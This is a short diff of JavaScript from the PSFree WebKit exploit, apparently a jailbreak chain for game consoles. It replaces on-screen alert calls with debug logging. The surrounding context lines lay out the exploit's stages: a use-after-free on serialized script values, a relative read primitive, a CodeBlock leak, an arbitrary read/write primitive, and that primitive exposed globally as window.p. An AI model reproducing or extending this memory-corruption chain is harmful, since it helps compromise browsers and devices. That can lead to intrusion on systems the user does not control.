@@ -576,7 +576,7 @@ async function make_arw(reader, view2, pop) {
     const propertyStorage = 8;
     const fakebt_off = fakebt_base + indexingHeader_size + propertyStorage;
 
-    showTemporaryAlert('PSFree: leak CodeBlock');
+    debug_log('PSFree: leak CodeBlock');
     // has too be greater than 0x10. the size of JSImmutableButterfly
     const bt_size = 0x10 + fakebt_off + arrayStorage_size;
     const [func, bt_addr, strs_addr] = await leak_code_block(rdr, bt_size);
@@ -813,11 +813,11 @@ window.run_psfree = async function(target) {
         return res;
     })();
 
-    showTemporaryAlert('PSFree: UaF SSV');
+    debug_log('PSFree: UaF SSV');
     const [fsets, indices] = prepare_uaf()
     const view = await uaf_ssv(fsets, indices[1]);
 
-    showTemporaryAlert('PSFree: get string relative read primitive');
+    debug_log('PSFree: get string relative read primitive');
     const rdr = await make_rdr(view);
 
     // make view2 now as to prevent earlier StringImpls from getting allocated
@@ -831,7 +831,7 @@ window.run_psfree = async function(target) {
         fset.cols = '';
     }
 
-    showTemporaryAlert('PSFree: achieve arbitrary read/write primitive');
+    debug_log('PSFree: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
 
     let prim = {
@@ -891,7 +891,7 @@ window.run_psfree = async function(target) {
         }
     };
 
-    showTemporaryAlert('PSFree: done');
+    debug_log('PSFree: done');
 
     window.p = prim;
 }
